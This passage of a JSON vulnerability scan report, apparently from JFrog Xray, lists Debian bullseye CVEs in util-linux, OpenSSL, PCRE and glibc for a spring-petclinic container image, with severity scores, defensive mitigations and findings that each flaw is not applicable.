         "component": "debian:bullseye:libblkid1",
         "source_id": "deb://debian:bullseye:libblkid1",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:util-linux",
         "source_id": "deb://debian:bullseye:util-linux",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607811",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "debian",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-5535"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2024-5535",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2024-5535",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607811",
         "severity": "Low",
         "severity_source": "JFrog",
         "pkg_type": "debian",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-5535"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_select_next_proto with an\nempty supported client protocols buffer may cause a crash or memory contents to\nbe sent to the peer.\n\nImpact summary: A buffer overread can have a range of potential consequences\nsuch as unexpected application beahviour or a crash. In particular this issue\ncould result in up to 255 bytes of arbitrary private data from memory being sent\nto the peer leading to a loss of confidentiality. However, only applications\nthat directly call the SSL_select_next_proto function with a 0 length list of\nsupported client protocols are affected by this issue. This would normally never\nbe a valid scenario and is typically not under attacker control but may occur by\naccident in the case of a configuration or programming error in the calling\napplication.\n\nThe OpenSSL API function SSL_select_next_proto is typically used by TLS\napplications that support ALPN (Application Layer Protocol Negotiation) or NPN\n(Next Protocol Negotiation). NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN. The SSL_select_next_proto function accepts a list of\nprotocols from the server and a list of protocols from the client and returns\nthe first protocol that appears in the server list that also appears in the\nclient list. In the case of no overlap between the two lists it returns the\nfirst item in the client list. In either case it will signal whether an overlap\nbetween the two lists was found. In the case where SSL_select_next_proto is\ncalled with a zero length client list it fails to notice this condition and\nreturns the memory immediately following the client list pointer (and reports\nthat there was no overlap in the lists).\n\nThis function is typically called from a server side application callback for\nALPN or a client side application callback for NPN. In the case of ALPN the list\nof protocols supplied by the client is guaranteed by libssl to never be zero in\nlength. The list of ...",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2024-5535",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2024-5535",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-52437",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Stack-based buffer overflow in the pcre32_copy_substring function in pcre_get.c in libpcre1 in PCRE 8.40 allows remote attackers to cause a denial of service (WRITE of size 4) or possibly have unspecified other impact via a crafted file.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre3",
         "source_id": "deb://debian:bullseye:libpcre3",
         "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
         "component_versions": {
            "id": "debian:bullseye:pcre3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2017-7245",
                     "cwe": [
                        "CWE-119"
                     ],
                     "cwe_details": {
                        "CWE-119": {
                           "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
                           "description": "The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "17"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "Stack-based buffer overflow in the pcre32_copy_substring function in pcre_get.c in libpcre1 in PCRE 8.40 allows remote attackers to cause a denial of service (WRITE of size 4) or possibly have unspecified other impact via a crafted file.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "cve_id": "CVE-2017-7245",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The `libpcre` package was not compiled with the vulnerable 32-bit mode",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "vulnerability_id": "CVE-2017-7245",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-52436",
         "severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Stack-based buffer overflow in the pcre32_copy_substring function in pcre_get.c in libpcre1 in PCRE 8.40 allows remote attackers to cause a denial of service (WRITE of size 268) or possibly have unspecified other impact via a crafted file.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre3",
         "source_id": "deb://debian:bullseye:libpcre3",
         "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
         "component_versions": {
            "id": "debian:bullseye:pcre3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2017-7246",
                     "cwe": [
                        "CWE-119"
                     ],
                     "cwe_details": {
                        "CWE-119": {
                           "name": "Improper Restriction of Operations within the Bounds of a Memory Buffer",
                           "description": "The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "17"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "Stack-based buffer overflow in the pcre32_copy_substring function in pcre_get.c in libpcre1 in PCRE 8.40 allows remote attackers to cause a denial of service (WRITE of size 268) or possibly have unspecified other impact via a crafted file.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "cve_id": "CVE-2017-7246",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The `libpcre` package was not compiled with the vulnerable 32-bit mode",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
            "vulnerability_id": "CVE-2017-7246",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-599387",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: Stack-based buffer overflow in netgroup cache\n\nIf the Name Service Cache Daemon's (nscd) fixed size cache is exhausted\nby client requests then a subsequent client request for netgroup data\nmay result in a stack-based buffer overflow.  This flaw was introduced\nin glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33599"
                  }
               ],
               "description": "nscd: Stack-based buffer overflow in netgroup cache  If the Name Service Cache Daemon's (nscd) fixed size cache is exhausted by client requests then a subsequent client request for netgroup data may result in a stack-based buffer overflow.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-599387",
            "VulnerabilityTitle": "",
            "ShortDescription": "A stack buffer overflow in the Name Service Cache Daemon (NSCD) in the GNU C library may lead to remote code execution.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nDisable netgroup caching in the NSCD configuration.\nRemove the following line from `/etc/nscd.conf` -\n```\nenable-cache netgroup yes\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Potential remote code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC and no technical writeup were published.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `/etc/nscd.conf` configuration file does not support netgroup caching by default.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The Name Service Cache Daemon accepts arbitrary network input.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=87801a8fd06db1d654eea3e4f7626ff476a9bdaa",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GlibC Advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0005",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-33599",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find NSCD executable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-33599",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-599387",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: Stack-based buffer overflow in netgroup cache\n\nIf the Name Service Cache Daemon's (nscd) fixed size cache is exhausted\nby client requests then a subsequent client request for netgroup data\nmay result in a stack-based buffer overflow.  This flaw was introduced\nin glibc 2.15 when the cache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33599"
                  }
               ],
               "description": "nscd: Stack-based buffer overflow in netgroup cache  If the Name Service Cache Daemon's (nscd) fixed size cache is exhausted by client requests then a subsequent client request for netgroup data may result in a stack-based buffer overflow.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
